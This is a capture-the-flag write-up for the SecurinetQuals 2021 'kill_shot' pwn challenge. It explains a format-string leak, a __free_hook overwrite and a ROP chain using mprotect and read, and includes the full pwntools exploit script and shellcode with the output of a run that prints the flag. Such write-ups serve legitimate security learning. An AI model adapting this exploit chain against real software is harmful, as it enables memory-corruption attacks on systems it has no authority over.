---
layout: post
title: "[SecurinetQuals2K21] kill_shot"
author: Green-Avocado
co-author: Kevin Zhang
---

# kill_shot

## Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Setup

The setup of the problem is as follow:

1. A function that provides a `printf()` leak.
2. A function called `kill()` that lets you write eight bytes to anywhere. Only called once.
3. A while loop that allows you to call `malloc()` and `free()` as many times as you want.

Our initial approach was to use our arbritray write in order to overwrite the return address with a one gadget.
However, the binary only allows certain syscalls via a seccomp filter.
Namely, `read`, `write`, `fstat`, `mprotect`, and `openat` are the only syscalls allowed.


## Approach

TLDR:
1. Leak addresses
2. Overwrite `__free_hook`
3. ROP with `mprotect` and `read`
4. Send shellcode
5. Return to shellcode
6. ???
7. Profit

Using the format specifier bug we can leak three addresses.
A stack address, a binary address, and a libc address.
We will see why this is useful later.

After the one gadget didn't work we tried  using `kill()` to write a stack address so that we could free it later in order make `malloc` return an address that was on the stack.
We spent quite a bit of time on this approach before Fillip told us about `__free_hook`.
A quick explanation of `__free_hook` is that it is a libc constant that is used whenever `free()` is called and if `__free_hook` is set to another function then it will call that function instead of `free()`.
Since we have a libc leak we can use `kill()` to write the address of `kill()` to `__free_hook`.
Then since we can call `free()` as many times as we want then we can write to anywhere we want as many times as we want.  

Now our ROP chain will consist of calling `mprotect` in order to get an rwx page somewhere in the binary then calling `read` in order to send shellcode.
Finally, return to where the shellcode is.

Our shellcode will call `read` so we can give it the path of the flag which is `/home/ctf/flag.txt`.
Then we will use that path in order to open the flag file using `openat` and use `read` again in order to read the contents of the flag.
Finally, use `write` in order to print the contents of the flag.


## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host bin.q21.ctfsecurinets.com --port 1338 kill_shot
from pwn import *
import funcy
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./kill_shot')
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.27.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'bin.q21.ctfsecurinets.com'
port = int(args.PORT or 1338)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    p = process([ld.path, exe.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

gdbscript = '''
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

paus()

# Format string vuln to leak addresses
formatstr = "%25$p%16$p%17$p "
io.recvuntil("Format: ")
print(formatstr)
io.sendline(formatstr)

s = io.recvuntil("\n").decode()[:-1]
s = s.split('0x')
s[3] = s[3].split(' ')[0]

libcBase = int(s[1], 16) - 0x21b97
stackLeak = int(s[2], 16)
binBase = int(s[3], 16) - 0x11b3

symKill = binBase + 0x000010b4
freeHook = libcBase + 0x3ed8e8
returnAddr = stackLeak + 0x8

io.success("libc base addr: " + hex(libcBase))
io.success("rbp stack leak: " + hex(stackLeak))
io.success("bin base addr: " + hex(binBase))



# Write symKill to __free_hook
io.recvuntil("Pointer: ")
io.sendline(str(freeHook))
io.recvuntil("Content: ")
io.send(p64(symKill))



# Create heap chunk 0
io.recvuntil('exit\n')
io.send('1')
io.recvuntil('Size: ')
io.send('8')
io.recvuntil("Data: ")
io.send('A')



# function for writing a rop chain by calling free, jumping to symKill
def add_rop(qword, rop_offset):
    io.recvuntil('exit\n')
    io.send('1')
    io.recvuntil('Size: ')
    io.send('8')
    io.recvuntil("Data: ")
    io.send('A')
    io.recvuntil('exit\n')
    io.send('2')
    io.recvuntil('Index: ')
    io.send('1')
    io.recvuntil("Pointer: ")
    io.send(str(returnAddr + (rop_offset * 0x8)))
    io.recvuntil("Content: ")
    io.send(p64(qword))
    io.success("wrote " + hex(qword) + " to " + hex(returnAddr + (rop_offset * 0x8)))



# Create rop chain
libc.address = libcBase
rop = ROP(libc)

writePage = binBase + (0x202100) // 4096 * 4096

rop.mprotect(writePage, 4096, 7)
rop.read(0, writePage, 0x1000)
rop.raw(writePage)
raw_rop = rop.chain()
raw_rop = list(funcy.chunks(8,raw_rop))

ropchain = raw_rop

rop_offset = 0
for i in ropchain:
    i = u64(i)
    add_rop(i, rop_offset)
    rop_offset += 1



# Create shellcode
string_addr = writePage + 0x300

shellcode = asm(shellcraft.read(0, string_addr, 100))
shellcode += asm(shellcraft.openat(0,string_addr,0))
shellcode += asm(shellcraft.read('rax',string_addr,100))
shellcode += asm(shellcraft.write(1, string_addr, 100))

io.recvuntil("exit\n")
io.sendline(b'3')
sleep(1)
io.send(shellcode)
sleep(1)
io.send('/home/ctf/flag.txt')



io.interactive()
```

```
-> % ./exploit.py 
[*] '/home/user/Documents/ctf/killshot/kill_shot'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/user/Documents/ctf/killshot/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/user/Documents/ctf/killshot/ld-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to bin.q21.ctfsecurinets.com on port 1338: Done
[*] Paused (press any to continue)
%25$p%16$p%17$p 
[+] libc base addr: 0x7f02f073e000
[+] rbp stack leak: 0x7ffc47118af0
[+] bin base addr: 0x5654b46b1000
[*] Loading gadgets for '/home/user/Documents/ctf/killshot/libc.so.6'
[+] wrote 0x7f02f086e889 to 0x7ffc47118af8
[+] wrote 0x7 to 0x7ffc47118b00
[+] wrote 0x1000 to 0x7ffc47118b08
[+] wrote 0x7f02f075f55f to 0x7ffc47118b10
[+] wrote 0x5654b48b3000 to 0x7ffc47118b18
[+] wrote 0x7f02f0859c00 to 0x7ffc47118b20
[+] wrote 0x7f02f086e889 to 0x7ffc47118b28
[+] wrote 0x1000 to 0x7ffc47118b30
[+] wrote 0x5654b48b3000 to 0x7ffc47118b38
[+] wrote 0x7f02f075f55f to 0x7ffc47118b40
[+] wrote 0x0 to 0x7ffc47118b48
[+] wrote 0x7f02f084e180 to 0x7ffc47118b50
[+] wrote 0x5654b48b3000 to 0x7ffc47118b58
[*] Switching to interactive mode
flag{this_really_needs_a_kill_shot!_cc5dcc74acd62fa74899efaff22d8f79}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
```

